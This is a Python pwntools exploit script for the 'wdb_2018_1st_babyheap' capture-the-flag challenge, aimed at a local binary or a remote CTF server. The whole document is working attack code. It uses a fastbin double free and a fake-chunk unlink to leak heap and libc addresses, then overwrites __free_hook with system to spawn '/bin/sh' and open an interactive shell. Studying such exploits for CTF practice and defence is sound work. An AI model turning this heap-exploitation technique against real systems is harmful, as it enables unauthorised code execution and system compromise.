import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='wdb_2018_1st_babyheap'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28135)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Choice:','1')
			io.sendlineafter('Index:',str(a))
			io.sendafter('Content:',c)

		def show(a):
			io.sendlineafter('Choice:','3')
			io.sendlineafter('Index:',str(a))

		def edit(a,c):
			io.sendlineafter('Choice:','2')
			io.sendlineafter('Index:',str(a))
			io.sendafter('Content:',c)

		def delete(a):
			io.sendlineafter('Choice:','4')
			io.sendlineafter('Index:',str(a))
		

		add(0,(p64(0)+p64(0x31))*2)
		add(1,(p64(0)+p64(0x31))*2)
		add(2,(p64(0)+p64(0x31))*2)
		add(3,'/bin/sh\x00\n')
		add(7,(p64(0)+p64(0x31))*2)
		delete(0)
		delete(1)
		delete(0)
		show(0)
		heap_base=u64(io.recvline()[:-1].ljust(8,'\x00'))-0x30
		edit(0,p64(heap_base+0x10)+'\n')
		add(4,p64(0)+p64(0x31)+p64(heap_base)+'\n')
		add(5,p64(0)*2+p64(0x20)+p64(0x90))
		add(6,p64(0)+p64(0x21)+p64(0x602060-0x18)+p64(0x602060-0x10))
		delete(1)
		show(5)

		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-0x10-88
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()

		edit(0,'\x00'*0x18+p64(libc.sym['__free_hook']))
		edit(0,p64(system_addr)+'\n')
		delete(3)



		success('libc_base:'+hex(libc_base))
		success('heap_base:'+hex(heap_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue